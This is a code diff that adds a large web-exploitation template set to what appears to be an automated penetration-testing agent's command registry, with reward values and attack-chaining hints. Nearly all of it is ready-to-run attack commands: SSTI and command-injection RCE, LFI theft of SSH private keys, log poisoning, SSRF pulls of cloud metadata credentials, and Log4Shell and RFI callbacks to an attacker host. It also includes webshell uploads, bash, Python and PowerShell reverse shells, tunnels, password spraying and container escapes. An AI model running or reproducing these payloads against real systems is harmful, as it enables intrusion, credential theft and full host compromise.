@@ -2616,6 +2616,676 @@ register(CommandTemplate(
 
 
 # =============================================================================
+# PHASE 9: WEB EXPLOITATION ARSENAL (SSTI, LFI, SSRF, Deserialization, etc.)
+# =============================================================================
+
+# --- Server-Side Template Injection (SSTI) ---
+register(CommandTemplate(
+    name="ssti_detect_jinja2",
+    template="curl -s '{url}' --data '{param}={{{{7*7}}}}' | grep -o '49'",
+    description="Detect Jinja2 SSTI by injecting {{7*7}} and checking for 49.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param"],
+    preconditions={"http_service_found"},
+    success_indicators=["49"],
+    typical_reward=8.0,
+    tags={"web", "ssti", "jinja2", "detection"},
+    why="SSTI in Jinja2/Flask apps leads to direct RCE via Python code execution",
+    when="Web app reflects user input through template engine (Flask, Django, Twig)",
+    enables=["ssti_exploit_jinja2"],
+))
+
+register(CommandTemplate(
+    name="ssti_exploit_jinja2",
+    template="curl -s '{url}' --data \"{param}={{{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}}}\"",
+    description="Exploit Jinja2 SSTI for RCE via os.popen.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param", "cmd"],
+    preconditions={"http_service_found", "ssti_confirmed"},
+    success_indicators=["uid=", "root:", "www-data"],
+    typical_reward=15.0,
+    tags={"web", "ssti", "jinja2", "rce"},
+    why="Full RCE through SSTI — execute arbitrary commands on the server",
+    when="SSTI confirmed in Jinja2/Flask application",
+    follows_after=["ssti_detect_jinja2"],
+))
+
+register(CommandTemplate(
+    name="ssti_detect_twig",
+    template="curl -s '{url}' --data '{param}={{{{7*7}}}}' | grep -o '49'",
+    description="Detect Twig SSTI (PHP Symfony). Same syntax as Jinja2.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param"],
+    preconditions={"http_service_found"},
+    success_indicators=["49"],
+    typical_reward=8.0,
+    tags={"web", "ssti", "twig", "php", "detection"},
+    why="SSTI in Twig (PHP) leads to RCE via PHP functions",
+    when="PHP web app using Symfony/Twig template engine",
+))
+
+register(CommandTemplate(
+    name="ssti_exploit_twig",
+    template="curl -s '{url}' --data \"{param}={{{{['{cmd}']|filter('system')}}}}\"",
+    description="Exploit Twig SSTI for RCE via system() filter.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param", "cmd"],
+    preconditions={"http_service_found", "ssti_confirmed"},
+    success_indicators=["uid=", "root:", "www-data"],
+    typical_reward=15.0,
+    tags={"web", "ssti", "twig", "php", "rce"},
+    why="Full RCE through Twig SSTI",
+    when="SSTI confirmed in PHP Twig application",
+))
+
+register(CommandTemplate(
+    name="ssti_detect_erb",
+    template="curl -s '{url}' --data '{param}=<%25%3d7*7%25>' | grep -o '49'",
+    description="Detect ERB SSTI (Ruby/Rails). Uses <%%= expr %>.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param"],
+    preconditions={"http_service_found"},
+    success_indicators=["49"],
+    typical_reward=8.0,
+    tags={"web", "ssti", "erb", "ruby", "detection"},
+    why="SSTI in ERB/Ruby leads to RCE via system() calls",
+    when="Ruby on Rails web application found",
+))
+
+register(CommandTemplate(
+    name="tplmap_scan",
+    template="python3 tplmap.py -u '{url}' -d '{param}=SSTI*'",
+    description="Automated SSTI detection and exploitation with tplmap.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param"],
+    preconditions={"http_service_found"},
+    success_indicators=["Confirmed", "Tplmap", "injection point"],
+    typical_reward=10.0,
+    tags={"web", "ssti", "scanner", "automated"},
+    why="Automated detection of SSTI across multiple template engines (Jinja2, Twig, ERB, etc.)",
+    when="Web app with user input reflected in page — automated alternative to manual testing",
+))
+
+# --- Local File Inclusion (LFI) / Remote File Inclusion (RFI) ---
+register(CommandTemplate(
+    name="lfi_etc_passwd",
+    template="curl -s '{url}?{param}=../../../../../../../../etc/passwd'",
+    description="Basic LFI to read /etc/passwd. Validates LFI vulnerability.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param"],
+    preconditions={"http_service_found"},
+    success_indicators=["root:", "bin/bash", "nologin", "/home/"],
+    typical_reward=8.0,
+    tags={"web", "lfi", "linux"},
+    why="LFI reveals system users and can chain to credential extraction or log poisoning RCE",
+    when="Web app includes files via parameter (page=, file=, include=, template=, path=)",
+    enables=["lfi_log_poison", "lfi_php_filter", "lfi_ssh_key"],
+))
+
+register(CommandTemplate(
+    name="lfi_double_encode",
+    template="curl -s '{url}?{param}=....//....//....//....//etc/passwd'",
+    description="LFI with double-dot bypass for basic filters.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param"],
+    preconditions={"http_service_found"},
+    success_indicators=["root:", "bin/bash", "nologin"],
+    typical_reward=8.5,
+    tags={"web", "lfi", "bypass", "linux"},
+    why="Bypasses simple '../' removal filters that only strip once",
+    when="Basic LFI fails but parameter is likely vulnerable (filter strips ../ once)",
+    follows_after=["lfi_etc_passwd"],
+))
+
+register(CommandTemplate(
+    name="lfi_php_filter",
+    template="curl -s '{url}?{param}=php://filter/convert.base64-encode/resource={file}'",
+    description="PHP filter wrapper to read source code as base64.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param", "file"],
+    preconditions={"http_service_found", "lfi_confirmed"},
+    success_indicators=["PD9w", "PCFET0", "base64"],
+    typical_reward=10.0,
+    tags={"web", "lfi", "php", "source-code"},
+    why="Read PHP source code (normally executed, not displayed) — reveals credentials, logic, more vulns",
+    when="LFI confirmed on PHP application — read config.php, db.php, index.php for secrets",
+    follows_after=["lfi_etc_passwd"],
+))
+
+register(CommandTemplate(
+    name="lfi_log_poison",
+    template="curl -s -A '<?php system($_GET[\"cmd\"]); ?>' '{url}' && curl -s '{url}?{param}=../../../../var/log/apache2/access.log&cmd={cmd}'",
+    description="LFI + log poisoning for RCE. Injects PHP in User-Agent, then includes access log.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param", "cmd"],
+    preconditions={"http_service_found", "lfi_confirmed"},
+    success_indicators=["uid=", "www-data", "root:"],
+    typical_reward=15.0,
+    tags={"web", "lfi", "log-poisoning", "rce"},
+    why="Converts LFI to RCE via log poisoning — no file upload needed",
+    when="LFI confirmed and log files are readable (Apache/nginx access/error logs)",
+    follows_after=["lfi_etc_passwd"],
+))
+
+register(CommandTemplate(
+    name="lfi_ssh_key",
+    template="curl -s '{url}?{param}=../../../../../../../../home/{user}/.ssh/id_rsa'",
+    description="LFI to steal SSH private keys for user access.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param", "user"],
+    preconditions={"http_service_found", "lfi_confirmed"},
+    success_indicators=["BEGIN", "PRIVATE KEY", "RSA", "OPENSSH"],
+    typical_reward=20.0,
+    tags={"web", "lfi", "ssh", "credential"},
+    why="SSH private keys allow direct login as the user without password",
+    when="LFI confirmed and user accounts known from /etc/passwd",
+    follows_after=["lfi_etc_passwd"],
+))
+
+register(CommandTemplate(
+    name="rfi_php_shell",
+    template="curl -s '{url}?{param}=http://{lhost}/shell.php'",
+    description="Remote File Inclusion to load a PHP shell from attacker server.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param", "lhost"],
+    preconditions={"http_service_found"},
+    success_indicators=["uid=", "www-data", "shell"],
+    typical_reward=15.0,
+    tags={"web", "rfi", "php", "shell"},
+    why="RFI loads attacker-hosted PHP shell for direct RCE",
+    when="PHP allow_url_include is enabled (rare but devastating when found)",
+))
+
+# --- Server-Side Request Forgery (SSRF) ---
+register(CommandTemplate(
+    name="ssrf_localhost_scan",
+    template="curl -s '{url}' --data '{param}=http://127.0.0.1:{port}/'",
+    description="SSRF to scan internal localhost services.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param", "port"],
+    preconditions={"http_service_found"},
+    success_indicators=["200", "OK", "html", "json", "Welcome"],
+    typical_reward=8.0,
+    tags={"web", "ssrf", "internal"},
+    why="SSRF accesses internal services not exposed externally — chain to Redis/Docker/admin panels",
+    when="Web app fetches URLs (image upload, webhook, URL preview, PDF generator)",
+    enables=["ssrf_redis_rce", "ssrf_cloud_metadata"],
+))
+
+register(CommandTemplate(
+    name="ssrf_cloud_metadata",
+    template="curl -s '{url}' --data '{param}=http://169.254.169.254/latest/meta-data/'",
+    description="SSRF to access AWS EC2 metadata service. Reveals IAM credentials.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param"],
+    preconditions={"http_service_found", "ssrf_confirmed"},
+    success_indicators=["ami-id", "instance-id", "iam", "security-credentials"],
+    typical_reward=20.0,
+    tags={"web", "ssrf", "cloud", "aws"},
+    why="AWS metadata endpoint reveals IAM credentials → full cloud account compromise",
+    when="SSRF confirmed and target is on AWS (EC2 instance)",
+    follows_after=["ssrf_localhost_scan"],
+))
+
+register(CommandTemplate(
+    name="ssrf_internal_admin",
+    template="curl -s '{url}' --data '{param}=http://{internal_host}:{port}/admin'",
+    description="SSRF to access internal admin panels not exposed externally.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param", "internal_host", "port"],
+    preconditions={"http_service_found", "ssrf_confirmed"},
+    success_indicators=["admin", "dashboard", "panel", "manage"],
+    typical_reward=12.0,
+    tags={"web", "ssrf", "admin"},
+    why="Internal admin panels often have no authentication when accessed from localhost",
+    when="SSRF confirmed and internal services/hostnames discovered",
+))
+
+# --- Command Injection ---
+register(CommandTemplate(
+    name="cmd_inject_semicolon",
+    template="curl -s '{url}' --data '{param}=test;{cmd}'",
+    description="OS command injection via semicolon separator.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param", "cmd"],
+    preconditions={"http_service_found"},
+    success_indicators=["uid=", "root:", "www-data", "Linux"],
+    typical_reward=12.0,
+    tags={"web", "command-injection", "rce"},
+    why="Direct OS command execution through web application input",
+    when="Web app runs system commands (ping, DNS lookup, file operations)",
+))
+
+register(CommandTemplate(
+    name="cmd_inject_pipe",
+    template="curl -s '{url}' --data '{param}=test|{cmd}'",
+    description="OS command injection via pipe operator.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param", "cmd"],
+    preconditions={"http_service_found"},
+    success_indicators=["uid=", "root:", "www-data"],
+    typical_reward=12.0,
+    tags={"web", "command-injection", "rce"},
+    why="Pipe injection — command output piped to attacker command",
+    when="Semicolon injection blocked but pipe not filtered",
+    follows_after=["cmd_inject_semicolon"],
+))
+
+register(CommandTemplate(
+    name="cmd_inject_backtick",
+    template="curl -s '{url}' --data '{param}=test`{cmd}`'",
+    description="OS command injection via backtick command substitution.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param", "cmd"],
+    preconditions={"http_service_found"},
+    success_indicators=["uid=", "root:", "www-data"],
+    typical_reward=12.0,
+    tags={"web", "command-injection", "rce"},
+    why="Backtick substitution often bypasses semicolon/pipe filters",
+    when="Other injection methods blocked",
+    follows_after=["cmd_inject_semicolon", "cmd_inject_pipe"],
+))
+
+register(CommandTemplate(
+    name="cmd_inject_blind_sleep",
+    template="curl -s -o /dev/null -w '%{{time_total}}' '{url}' --data '{param}=test;sleep+5'",
+    description="Blind command injection detection via sleep timing.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "param"],
+    preconditions={"http_service_found"},
+    success_indicators=["5.", "6.", "7."],
+    typical_reward=8.0,
+    tags={"web", "command-injection", "blind"},
+    why="Detect blind command injection when output is not reflected in response",
+    when="Suspected command injection but no output visible in response",
+))
+
+# --- Shellshock ---
+register(CommandTemplate(
+    name="shellshock_cgi",
+    template="curl -s -H 'User-Agent: () {{ :; }}; echo; /bin/bash -c \"{cmd}\"' http://{target}/cgi-bin/{script}",
+    description="Shellshock (CVE-2014-6271) exploitation via CGI script.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target", "script", "cmd"],
+    preconditions={"http_service_found", "cgi_found"},
+    success_indicators=["uid=", "root:", "www-data", "Linux"],
+    typical_reward=15.0,
+    tags={"web", "shellshock", "cve", "cgi", "rce"},
+    why="CVE-2014-6271 — Bash shell function environment variable injection via HTTP headers",
+    when="Apache with /cgi-bin/ scripts (.sh, .cgi, .pl) found on target",
+))
+
+# --- Heartbleed ---
+register(CommandTemplate(
+    name="heartbleed_exploit",
+    template="nmap -p {port} --script ssl-heartbleed {target}",
+    description="Test for Heartbleed (CVE-2014-0160) OpenSSL memory leak.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    optional_params={"port": "443"},
+    preconditions={"ports_discovered"},
+    success_indicators=["VULNERABLE", "Heartbleed"],
+    typical_reward=10.0,
+    tags={"ssl", "heartbleed", "cve", "memory-leak"},
+    why="CVE-2014-0160 — leak server memory including private keys, session tokens, passwords",
+    when="HTTPS/TLS service found, especially OpenSSL 1.0.1 through 1.0.1f",
+))
+
+# --- Log4Shell ---
+register(CommandTemplate(
+    name="log4shell_detect",
+    template="curl -s -H 'X-Api-Version: ${{jndi:ldap://{lhost}:1389/a}}' -H 'User-Agent: ${{jndi:ldap://{lhost}:1389/a}}' http://{target}:{port}/",
+    description="Detect Log4Shell (CVE-2021-44228) via JNDI injection in headers.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target", "lhost"],
+    optional_params={"port": "8080"},
+    preconditions={"http_service_found"},
+    success_indicators=["Callback", "LDAP", "DNS"],
+    typical_reward=12.0,
+    tags={"web", "log4shell", "cve", "java", "jndi"},
+    why="CVE-2021-44228 — critical Java RCE via Log4j JNDI lookup in any logged input",
+    when="Java-based web application found (Tomcat, Spring, Elasticsearch, etc.)",
+))
+
+# --- Drupalgeddon ---
+register(CommandTemplate(
+    name="drupalgeddon2",
+    template="python3 drupalgeddon2.py {url}",
+    description="Drupalgeddon 2 (CVE-2018-7600) — Drupal RCE without authentication.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url"],
+    preconditions={"http_service_found", "drupal_found"},
+    success_indicators=["uid=", "www-data", "shell"],
+    typical_reward=15.0,
+    tags={"web", "drupal", "cve", "rce"},
+    why="CVE-2018-7600 — pre-auth RCE in Drupal 7.x and 8.x. One of the most critical CMS vulns",
+    when="Drupal CMS detected (check /CHANGELOG.txt, /core/CHANGELOG.txt for version)",
+))
+
+# --- File Upload Bypass ---
+register(CommandTemplate(
+    name="upload_php_double_ext",
+    template="curl -s -F 'file=@shell.php.jpg;type=image/jpeg' '{url}'",
+    description="Upload PHP shell with double extension bypass.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url"],
+    preconditions={"http_service_found", "upload_found"},
+    success_indicators=["uploaded", "success", "200"],
+    typical_reward=10.0,
+    tags={"web", "file-upload", "bypass", "webshell"},
+    why="Double extension bypasses filters that check only the last extension",
+    when="File upload exists with extension-based filtering",
+))
+
+register(CommandTemplate(
+    name="upload_php_magic_bytes",
+    template="curl -s -F 'file=@shell.php.gif;type=image/gif' '{url}'",
+    description="Upload PHP shell with GIF magic bytes header (GIF89a).",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url"],
+    preconditions={"http_service_found", "upload_found"},
+    success_indicators=["uploaded", "success"],
+    typical_reward=10.0,
+    tags={"web", "file-upload", "bypass", "polyglot"},
+    why="GIF89a magic bytes bypass content-type validation that checks file headers",
+    when="File upload validates content type via magic bytes but not extension properly",
+))
+
+register(CommandTemplate(
+    name="upload_htaccess",
+    template="curl -s -F 'file=@.htaccess' '{url}'",
+    description="Upload .htaccess to make .txt files execute as PHP.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url"],
+    preconditions={"http_service_found", "upload_found"},
+    success_indicators=["uploaded", "success"],
+    typical_reward=12.0,
+    tags={"web", "file-upload", "htaccess", "apache"},
+    why="If .htaccess upload succeeds, any .txt file can execute as PHP → webshell",
+    when="Apache server with AllowOverride enabled (common in shared hosting)",
+    enables=["upload_php_double_ext"],
+))
+
+register(CommandTemplate(
+    name="upload_aspx_shell",
+    template="curl -s -F 'file=@shell.aspx' '{url}'",
+    description="Upload ASPX web shell for IIS/Windows targets.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url"],
+    preconditions={"http_service_found", "upload_found"},
+    success_indicators=["uploaded", "success"],
+    typical_reward=10.0,
+    tags={"web", "file-upload", "aspx", "windows", "iis"},
+    why="ASPX shells for Windows/IIS targets — alternative to PHP shells",
+    when="IIS web server with file upload functionality",
+))
+
+# --- Web Shell Interaction ---
+register(CommandTemplate(
+    name="webshell_cmd",
+    template="curl -s '{url}?cmd={cmd}'",
+    description="Execute commands via deployed web shell.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url", "cmd"],
+    preconditions={"webshell_deployed"},
+    success_indicators=["uid=", "www-data", "root:", "nt authority"],
+    typical_reward=5.0,
+    tags={"web", "webshell", "rce"},
+    why="Interact with deployed web shell to execute commands on target",
+    when="Web shell successfully uploaded and accessible",
+))
+
+# --- Deserialization ---
+register(CommandTemplate(
+    name="ysoserial_java",
+    template="java -jar ysoserial.jar {gadget} '{cmd}' | base64",
+    description="Generate Java deserialization payload with ysoserial.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["gadget", "cmd"],
+    optional_params={"gadget": "CommonsCollections1"},
+    preconditions={"java_deser_found"},
+    success_indicators=["rO0AB", "base64"],
+    typical_reward=15.0,
+    tags={"web", "deserialization", "java", "rce"},
+    why="Java deserialization → RCE via gadget chains in application classpath",
+    when="Java app uses ObjectInputStream, cookies with rO0AB or ACED0005, ViewState",
+))
+
+register(CommandTemplate(
+    name="phpggc_laravel",
+    template="phpggc Laravel/RCE1 system '{cmd}' | base64",
+    description="Generate PHP deserialization payload for Laravel/Symfony.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["cmd"],
+    preconditions={"php_deser_found"},
+    success_indicators=["base64", "O:"],
+    typical_reward=15.0,
+    tags={"web", "deserialization", "php", "laravel", "rce"},
+    why="PHP deserialization → RCE via POP chains in Laravel/Symfony",
+    when="PHP app uses unserialize() on user input, cookies with O: or a: serialized data",
+))
+
+# --- JWT Attacks ---
+register(CommandTemplate(
+    name="jwt_none_attack",
+    template="python3 -c \"import jwt; print(jwt.encode({{'sub':'{user}','role':'admin'}}, '', algorithm='none'))\"",
+    description="JWT algorithm 'none' attack — forge admin token without secret.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["user"],
+    preconditions={"jwt_found"},
+    success_indicators=["eyJ"],
+    typical_reward=12.0,
+    tags={"web", "jwt", "auth-bypass"},
+    why="JWT none algorithm bypass creates valid tokens without knowing the secret",
+    when="JWT-based authentication found — always try none algorithm first",
+))
+
+register(CommandTemplate(
+    name="jwt_crack_secret",
+    template="hashcat -m 16500 {jwt_file} {wordlist} --force",
+    description="Crack JWT HMAC secret with hashcat.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["jwt_file", "wordlist"],
+    preconditions={"jwt_found"},
+    success_indicators=["Cracked", "Status"],
+    typical_reward=12.0,
+    tags={"web", "jwt", "hashcat", "credential"},
+    why="Weak JWT secrets can be cracked to forge arbitrary tokens",
+    when="JWT uses HMAC (HS256/HS384/HS512) — try common wordlists",
+))
+
+# --- CMS Exploitation ---
+register(CommandTemplate(
+    name="joomscan",
+    template="joomscan -u {url}",
+    description="Joomla CMS vulnerability scanner.",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["url"],
+    preconditions={"http_service_found", "joomla_found"},
+    success_indicators=["Joomla", "version", "vulnerability", "component"],
+    typical_reward=4.0,
+    tags={"web", "joomla", "cms", "scanner"},
+    why="Automated Joomla vulnerability detection — finds components, version, and known CVEs",
+    when="Joomla CMS detected on target",
+))
+
+register(CommandTemplate(
+    name="droopescan",
+    template="droopescan scan drupal -u {url}",
+    description="Drupal CMS vulnerability scanner.",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["url"],
+    preconditions={"http_service_found", "drupal_found"},
+    success_indicators=["Drupal", "version", "plugin", "theme"],
+    typical_reward=4.0,
+    tags={"web", "drupal", "cms", "scanner"},
+    why="Automated Drupal enumeration — discovers version, modules, themes, users",
+    when="Drupal CMS detected (check /CHANGELOG.txt or generator meta tag)",
+))
+
+# --- XXE (XML External Entity) ---
+register(CommandTemplate(
+    name="xxe_file_read",
+    template="curl -s -X POST '{url}' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'",
+    description="XXE injection to read local files via XML parser.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url"],
+    preconditions={"http_service_found", "xml_endpoint_found"},
+    success_indicators=["root:", "bin/bash", "nologin"],
+    typical_reward=10.0,
+    tags={"web", "xxe", "xml"},
+    why="XXE exploits XML parsers to read files, perform SSRF, or achieve RCE",
+    when="Application accepts XML input (SOAP, REST with XML, file upload with XML/SVG)",
+))
+
+# --- NoSQL Injection ---
+register(CommandTemplate(
+    name="nosqli_login_bypass",
+    template="curl -s '{url}' -H 'Content-Type: application/json' -d '{{\"username\":{{\"$ne\":\"\"}},\"password\":{{\"$ne\":\"\"}}}}'",
+    description="NoSQL injection login bypass via MongoDB $ne operator.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["url"],
+    preconditions={"http_service_found"},
+    success_indicators=["welcome", "dashboard", "admin", "session", "token"],
+    typical_reward=10.0,
+    tags={"web", "nosql", "mongodb", "auth-bypass"},
+    why="NoSQL injection bypasses authentication in MongoDB-backed applications",
+    when="Web app with JSON login endpoint — suspect MongoDB/Node.js backend",
+))
+
+# --- Reverse Shell Generators ---
+register(CommandTemplate(
+    name="revshell_bash",
+    template="bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
+    description="Bash reverse shell — most common Linux reverse shell.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["lhost", "lport"],
+    preconditions={"shell_obtained"},
+    success_indicators=["bash", "$", "#"],
+    typical_reward=3.0,
+    tags={"shell", "reverse-shell", "linux"},
+    why="Upgrade from limited shell to full interactive reverse shell",
+    when="Have command execution but need interactive shell (web shell → reverse shell)",
+))
+
+register(CommandTemplate(
+    name="revshell_python",
+    template="python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
+    description="Python reverse shell — works on most Linux systems with Python3.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["lhost", "lport"],
+    preconditions={"shell_obtained"},
+    success_indicators=["bash", "$", "#"],
+    typical_reward=3.0,
+    tags={"shell", "reverse-shell", "python", "linux"},
+    why="Python reverse shell when bash reverse shell fails or is blocked",
+    when="Python3 available on target but bash -i redirect not working",
+))
+
+register(CommandTemplate(
+    name="revshell_powershell",
+    template="powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}\"",
+    description="PowerShell reverse shell for Windows targets.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["lhost", "lport"],
+    preconditions={"shell_obtained"},
+    success_indicators=["PS ", "C:\\"],
+    typical_reward=3.0,
+    tags={"shell", "reverse-shell", "powershell", "windows"},
+    why="PowerShell reverse shell for Windows targets",
+    when="Windows target with PowerShell execution allowed",
+))
+
+# --- Proxy / Tunneling ---
+register(CommandTemplate(
+    name="chisel_server",
+    template="chisel server --reverse --port {port}",
+    description="Start chisel reverse proxy server on attacker.",
+    phase=AttackPhase.LATERAL_MOVEMENT,
+    required_params=["port"],
+    preconditions={"shell_obtained"},
+    success_indicators=["server", "listening"],
+    typical_reward=3.0,
+    tags={"tunnel", "proxy", "chisel"},
+    why="Chisel enables port forwarding through firewalls for accessing internal services",
+    when="Need to access internal services from compromised host (e.g., localhost-only services)",
+))
+
+register(CommandTemplate(
+    name="chisel_client",
+    template="chisel client {lhost}:{lport} R:{remote_port}:127.0.0.1:{target_port}",
+    description="Connect chisel client to forward internal ports to attacker.",
+    phase=AttackPhase.LATERAL_MOVEMENT,
+    required_params=["lhost", "lport", "remote_port", "target_port"],
+    preconditions={"shell_obtained"},
+    success_indicators=["connected", "session"],
+    typical_reward=5.0,
+    tags={"tunnel", "proxy", "chisel", "port-forward"},
+    why="Forward internal-only services to attacker for exploitation (e.g., localhost:8888 → attacker:8888)",
+    when="Internal service found via SSRF or netstat that's only bound to localhost",
+    follows_after=["chisel_server"],
+))
+
+register(CommandTemplate(
+    name="ssh_tunnel_local",
+    template="ssh -L {local_port}:127.0.0.1:{remote_port} {user}@{target} -N -f",
+    description="SSH local port forward to access internal services.",
+    phase=AttackPhase.LATERAL_MOVEMENT,
+    required_params=["local_port", "remote_port", "user", "target"],
+    preconditions={"credentials_known", "ssh_service_found"},
+    success_indicators=["forwarding"],
+    typical_reward=5.0,
+    tags={"tunnel", "ssh", "port-forward"},
+    why="SSH tunneling for accessing services bound to localhost on target",
+    when="Have SSH credentials and need to access internal services (VNC, databases, admin panels)",
+))
+
+# --- Credential Spraying ---
+register(CommandTemplate(
+    name="crackmapexec_password_spray",
+    template="crackmapexec smb {target} -u {userlist} -p {password} --continue-on-success",
+    description="Password spray across multiple users via SMB.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target", "userlist", "password"],
+    preconditions={"smb_service_found"},
+    success_indicators=["[+]", "Pwn3d", "STATUS_LOGON_FAILURE"],
+    typical_reward=8.0,
+    tags={"smb", "password-spray", "ad"},
+    why="Test one password against many users — avoids account lockout (vs brute force)",
+    when="Active Directory environment with username list and common password to test",
+))
+
+# --- Container / Docker Attacks ---
+register(CommandTemplate(
+    name="docker_sock_escape",
+    template="docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host bash",
+    description="Docker socket escape — mount host filesystem and chroot.",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained", "docker_socket_found"},
+    success_indicators=["root@", "#", "host"],
+    typical_reward=25.0,
+    tags={"docker", "container-escape", "privesc"},
+    why="Docker socket access = full host compromise via container with host filesystem mount",
+    when="Docker socket (/var/run/docker.sock) is accessible from current shell",
+))
+
+register(CommandTemplate(
+    name="lxd_escape",
+    template="lxd init --auto && lxc image import alpine.tar.gz --alias alpine && lxc init alpine privesc -c security.privileged=true && lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true && lxc start privesc && lxc exec privesc /bin/bash",
+    description="LXD group privilege escalation — create privileged container with host mount.",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"shell_obtained"},
+    success_indicators=["root@", "#"],
+    typical_reward=25.0,
+    tags={"lxd", "container-escape", "privesc", "linux"},
+    why="Users in the lxd group can create privileged containers with full host filesystem access",
+    when="Current user is in the lxd group (check with 'id')",
+))
+
+
+# =============================================================================
 # HELPER FUNCTIONS
 # =============================================================================
 
